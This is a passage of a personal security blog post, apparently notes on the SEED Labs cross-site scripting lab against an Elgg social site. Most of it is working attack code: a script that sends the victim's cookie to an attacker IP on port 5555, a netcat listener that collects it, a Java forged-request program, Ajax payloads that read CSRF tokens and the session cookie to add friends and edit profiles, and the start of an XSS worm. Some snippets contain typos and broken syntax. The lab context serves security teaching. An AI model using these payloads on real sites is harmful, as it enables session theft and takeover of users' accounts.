<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Meow’s CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet" /><meta property="og:locale" content="en" /><meta name="description" content="Cross Site Scripting Filter Evasion Cheat Sheet" /><meta property="og:description" content="Cross Site Scripting Filter Evasion Cheat Sheet" /><link rel="canonical" href="https://ocholuo.github.io//posts/XSS-Filter-Evasion-Cheat-Sheet/" /><meta property="og:url" content="https://ocholuo.github.io//posts/XSS-Filter-Evasion-Cheat-Sheet/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-19T11:11:11-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Meow’s CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-02T17:22:06-05:00","datePublished":"2020-09-19T11:11:11-04:00","description":"Cross Site Scripting Filter Evasion Cheat Sheet","headline":"Meow’s CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/XSS-Filter-Evasion-Cheat-Sheet/"},"url":"https://ocholuo.github.io//posts/XSS-Filter-Evasion-Cheat-Sheet/"}</script><title>Meow's CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Meow's CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Meow's CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 19, 2020, 11:11 AM -0400" >Sep 19, 2020<i class="unloaded">2020-09-19T11:11:11-04:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Jan 2, 2023, 2:22 PM -0800" >Jan 2<i class="unloaded">2023-01-02T17:22:06-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="8629 words">47 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><h1 id="cross-site-scripting-filter-evasion-cheat-sheet">Cross Site Scripting Filter Evasion Cheat Sheet</h1><p>[toc]</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>    __∧_∧__    ~~~~~
　／(*´O｀)／＼
／|￣∪∪￣|＼／
　|＿＿ ＿|／

por favor, no lo usar para hacer algo malo
just learning note, please don't use it to do something wrong
kali用得好，监狱进得早，与君共勉

</pre></table></code></div></div><hr /><h1 id="seed-labs--cross-site-scripting-attack-lab">SEED Labs – Cross-Site Scripting Attack Lab</h1><h2 id="posting-a-malicious-message-to-display-an-alert-window">Posting a Malicious Message to Display an Alert Window</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c1">// short code</span>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>

<span class="c1">// long code</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span>
        <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网站//www.example.com/myscripts.js</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="c1">// store the JavaScript program in a standalone file</span>
<span class="c1">// save it with the .js extension</span>
<span class="c1">// refer to it using the src attribute in the &lt;script&gt; tag.</span>
</pre></table></code></div></div><h2 id="stealing-cookie">stealing cookie</h2><ul><li>the browser tries to load the image from the URL in the <code class="language-plaintext highlighter-rouge">src</code> field<li>an <code class="language-plaintext highlighter-rouge">HTTP GET request</code> sent to the attacker’s machine.<ul><li>in the mean time, it sends the cookies to the <code class="language-plaintext highlighter-rouge">port 5555</code> of the attacker’s machine</ul></ul><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>// The cookie starts after %3D.

GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
</pre></table></code></div></div><ul><li>the attacker has a TCP server listening to the same port.<ul><li><code class="language-plaintext highlighter-rouge">$ nc -l 5555 -v</code></ul><li>The server can print out whatever it receives.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c1">// send out the cookies</span>
<span class="c1">// http GET</span>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src=http网址attackerIP:5555?c=</span><span class="dl">'</span>
                     <span class="o">+</span> <span class="nf">escape</span><span class="p">(</span><span class="nx">decument</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> &gt;</span><span class="dl">'</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><h2 id="session-hijacking-using-the-stolen-cookie">Session Hijacking using the Stolen Cookie</h2><div class="language-java highlighter-rouge"><div class="code-header" text-data="java"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HTTPSimpleForge</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">responseCode</span><span class="o">;</span>
        <span class="nc">InputStream</span> <span class="n">responseIn</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>

        <span class="nc">String</span> <span class="n">requestDetails</span> <span class="o">=</span> <span class="s">"&amp;__elgg_ts=&lt;&lt;correct_elgg_ts_value&gt;&gt;&amp;__elgg_token=&lt;&lt;correct_elgg_token_value&gt;&gt;"</span><span class="o">;</span>

        <span class="c1">// URL to be forged.</span>
        <span class="no">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URL</span> <span class="o">(</span><span class="s">"http网址www.xsslabelgg.com/action/friends/add?friend=&lt;&lt;friend_user_guid&gt;&gt;"</span><span class="o">+</span><span class="n">requestDetails</span><span class="o">);</span>

        <span class="c1">// URLConnection instance is created</span>
        <span class="c1">// to further parameterize a resource request past what the state members of URL instance can represent.</span>
        <span class="nc">HttpURLConnection</span> <span class="n">urlConn</span> <span class="o">=</span> <span class="o">(</span><span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">urlConn</span> <span class="k">instanceof</span> <span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">urlConn</span><span class="o">.</span><span class="na">setConnectTimeout</span><span class="o">(</span><span class="mi">60000</span><span class="o">);</span>
            <span class="n">urlConn</span><span class="o">.</span><span class="na">setReadTimeout</span><span class="o">(</span><span class="mi">90000</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="c1">// addRequestProperty method</span>
        <span class="c1">// to add HTTP Header Information.</span>
        <span class="c1">// add User-Agent HTTP header to the forged HTTP packet.</span>
        <span class="c1">// Add other necessary HTTP Headers yourself. Cookies should be stolen</span>
        <span class="c1">// using the method in task3.</span>
        <span class="n">urlConn</span><span class="o">.</span><span class="na">addRequestProperty</span><span class="o">(</span><span class="s">"User-agent"</span><span class="o">,</span><span class="s">"Sun JDK 1.6"</span><span class="o">);</span>

        <span class="c1">//HTTP Post Data which includes the information to be sent to the server.</span>
        <span class="nc">String</span> <span class="n">data</span> <span class="o">=</span> <span class="s">"name=...&amp;guid=.."</span><span class="o">;</span>

        <span class="c1">// DoOutput flag of URL Connection</span>
        <span class="c1">// should be set to true to send HTTP POST message.</span>
        <span class="n">urlConn</span><span class="o">.</span><span class="na">setDoOutput</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>

        <span class="c1">// OutputStreamWriter is used to write the HTTP POST data</span>
        <span class="c1">// to the url connection.</span>
        <span class="nc">OutputStreamWriter</span> <span class="n">wr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">OutputStreamWriter</span><span class="o">(</span><span class="n">urlConn</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
        <span class="n">wr</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
        <span class="n">wr</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>

        <span class="c1">// HttpURLConnection a subclass of URLConnection is returned by</span>
        <span class="c1">// url.openConnection() since the url is an http request.</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">urlConn</span> <span class="k">instanceof</span> <span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">HttpURLConnection</span> <span class="n">httpConn</span> <span class="o">=</span> <span class="o">(</span><span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="n">urlConn</span><span class="o">;</span>
            <span class="c1">// Contacts the web server</span>
            <span class="c1">// gets the status code from HTTP Response message.</span>
            <span class="n">responseCode</span> <span class="o">=</span> <span class="n">httpConn</span><span class="o">.</span><span class="na">getResponseCode</span><span class="o">();</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Response Code = "</span> <span class="o">+</span> <span class="n">responseCode</span><span class="o">);</span>

            <span class="c1">// HTTP status code</span>
            <span class="c1">// HTTP_OK means the response was received Successfully.</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">responseCode</span> <span class="o">==</span> <span class="nc">HttpURLConnection</span><span class="o">.</span><span class="na">HTTP_OK</span><span class="o">){</span>
                <span class="c1">// Get the input stream from url connection object.</span>
                <span class="n">responseIn</span> <span class="o">=</span> <span class="n">urlConn</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
                <span class="c1">// Create an instance for BufferedReader</span>
                <span class="c1">// to read the response line by line.</span>
                <span class="nc">BufferedReader</span> <span class="n">buf_inp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">();</span>
                <span class="k">new</span> <span class="nf">InputStreamReader</span><span class="o">(</span><span class="n">responseIn</span><span class="o">));</span>
                <span class="nc">String</span> <span class="n">inputLine</span><span class="o">;</span>
                <span class="k">while</span><span class="o">((</span><span class="n">inputLine</span> <span class="o">=</span> <span class="n">buf_inp</span><span class="o">.</span><span class="na">readLine</span><span class="o">())!=</span><span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">inputLine</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
            <span class="k">catch</span> <span class="o">(</span><span class="nc">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><h3 id="get-with-xss---add-friend">GET with XSS - add friend</h3><ol><li>capture the GET request packet<ul><li>Using the <code class="language-plaintext highlighter-rouge">"HTTP Header Live"</code> add-on to Inspect HTTP Headers</ul></ol><p><img data-proofer-ignore data-src="https://i.imgur.com/rRo8aig.png" alt="Screen Shot 2020-09-20 at 00.18.19" /></p><p><img data-proofer-ignore data-src="https://i.imgur.com/lzjweg9.png" alt="Screen Shot 2020-09-20 at 00.16.52" /></p><ol><li>construct the URL for send add friend Request</ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// C: js to access Security Token __elgg_token</span>
    <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&amp;__elgg_token</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>

    <span class="c1">// B: js to access Time Stamp __elgg_ts</span>
    <span class="kd">var</span> <span class="nx">ts</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&amp;__elgg_ts</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>

    <span class="c1">// A: Find user ID from LiveHTTPHeader</span>
    <span class="kd">var</span> <span class="nx">sendurl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http网址www.web.com/action/add?friend=42</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="nx">ts</span><span class="p">;</span>


    <span class="c1">// write the Ajax code</span>
    <span class="kd">var</span> <span class="nx">Ajax</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
    <span class="c1">// create and send Ajax request to add friend</span>
    <span class="nx">Ajax</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>

    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">sendurl</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">www.web.com</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>

    <span class="c1">// D: js to access the session cookie</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="p">}</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><h3 id="post-with-js---modify-profile">POST with Js - modify profile</h3><p><img data-proofer-ignore data-src="https://i.imgur.com/75zUEkB.png" alt="Screen Shot 2020-09-20 at 01.02.54" /></p><ol><li><p>capture the POST request packet</p><li><p>construct the URL for send add friend Request</p><li><p>write the Ajax code</p></ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>

    <span class="c1">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token</span>
    <span class="kd">var</span> <span class="nx">userName</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">guid</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;guid=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_ts=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>

    <span class="c1">//Construct the content</span>
    <span class="kd">var</span> <span class="nx">content</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">My new profile text.</span><span class="dl">"</span><span class="p">;</span>

    <span class="c1">//Create and send Ajax request to modify profile</span>
    <span class="nx">Ajax</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    <span class="nx">Ajax</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">sendurl</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">www.web.com</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><hr /><h3 id="writing-an-xss-worm">Writing an XSS worm</h3><ul><li>coding a worm which can change the information of an account in the web app.<li>This requires the analysis of changing the ‘about me’ section in the web app.<li>The attacker user11 uses the other account samy to update the ‘about me’ section to study the process.<li>The ‘inspect element’ reveals that the process is a <code class="language-plaintext highlighter-rouge">POST</code> request which requires few parameters from the document.<ul><li>These parameters are specific to the session and the user,<li>therefore, searching the parameters in the document</ul></ul><p>The javascript code must contain</p><ul><li>the <code class="language-plaintext highlighter-rouge">post request</code> required to proceed<li>with the changing of the text in the ‘about me’ section.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/action/profile/edit</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token__elgg_ts</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>

<span class="nx">ff</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>

<span class="nx">ff</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
